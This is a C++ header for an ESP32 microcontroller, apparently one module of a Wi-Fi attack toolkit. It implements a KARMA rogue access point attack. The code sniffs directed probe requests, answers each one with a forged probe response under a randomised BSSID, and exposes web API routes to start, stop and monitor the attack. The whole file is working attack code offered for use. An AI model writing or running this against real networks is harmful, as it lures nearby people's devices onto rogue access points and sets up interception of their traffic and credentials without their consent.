#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"

// KARMA attack: respond to any directed probe request with a matching AP
// Puts WiFi in promiscuous, intercepts probe requests, responds with probe responses
struct KarmaProbe { uint8_t sa[6]; char ssid[33]; uint8_t ch; };

static bool karma_running = false;
static volatile uint32_t karma_replied = 0;
static uint8_t karma_ap[6] = {0x02,0xDE,0xAD,0xBE,0xEF,0x01};
static bool karma_wpa = false;
static QueueHandle_t karma_q = nullptr;
static TaskHandle_t karma_task_h = nullptr;

static void karma_sniff(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || !karma_q) return;
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* pl = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 28 || pl[0] != 0x40) return; // must be probe request
  const uint8_t* ie = pl + 24;
  int ielen = len - 28; // subtract header(24) + FCS(4)
  if (ielen < 2 || ie[0] != 0 || ie[1] == 0) return; // ignore null/broadcast probes
  uint8_t ssidlen = ie[1];
  if (ssidlen > 32 || ssidlen + 2 > ielen) return;
  KarmaProbe probe;
  memcpy(probe.sa, pl + 10, 6);
  memcpy(probe.ssid, ie + 2, ssidlen); probe.ssid[ssidlen] = 0;
  probe.ch = (uint8_t)p->rx_ctrl.channel;
  xQueueSend(karma_q, &probe, 0); // non-blocking, drop if full
}

static void karma_task_fn(void*) {
  KarmaProbe probe;
  uint8_t f[128];
  while (karma_running) {
    if (xQueueReceive(karma_q, &probe, pdMS_TO_TICKS(100)) == pdTRUE) {
      // Use a fresh random BSSID per response so clients see different APs
      uint8_t bssid[6];
      memcpy(bssid, karma_ap, 6);
      bssid[5] ^= (uint8_t)(esp_random() & 0x0F); // vary last nibble
      size_t n = f_probeResp(f, probe.sa, bssid, probe.ssid, probe.ch, karma_wpa);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      karma_replied++;
    }
  }
  karma_task_h = nullptr; vTaskDelete(nullptr);
}

void aegisSniff(void*, wifi_promiscuous_pkt_type_t);
static bool karma_start(const String& q) {
  int i;
  if ((i = q.indexOf("wpa=")) >= 0) karma_wpa = q.substring(i+4).toInt() != 0;
  for (int k = 0; k < 6; k++) karma_ap[k] = esp_random() & 0xFF;
  karma_ap[0] = (karma_ap[0] & 0xFC) | 0x02;
  if (!karma_q) karma_q = xQueueCreate(16, sizeof(KarmaProbe));
  xQueueReset(karma_q);
  karma_replied = 0; karma_running = true;
  xTaskCreate(karma_task_fn, "karma", 3072, nullptr, 4, &karma_task_h);
  wifi_promiscuous_filter_t f = {}; f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous_rx_cb(karma_sniff);
  esp_wifi_set_promiscuous(true);
  return true;
}

static void karma_stop() {
  karma_running = false;
  esp_wifi_set_promiscuous_rx_cb(aegisSniff);
  wifi_promiscuous_filter_t f = {}; f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous(true);
}

static void karma_routes() {
  extern WebServer server;
  server.on("/api/karma/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("karma", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/karma/stop", HTTP_POST, [](){
    tool_stop("karma"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/karma/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(karma_running?1:0)+
      ",\"replied\":"+String(karma_replied)+
      ",\"msg\":\"replied to "+String(karma_replied)+" probes\"}");
  });
}
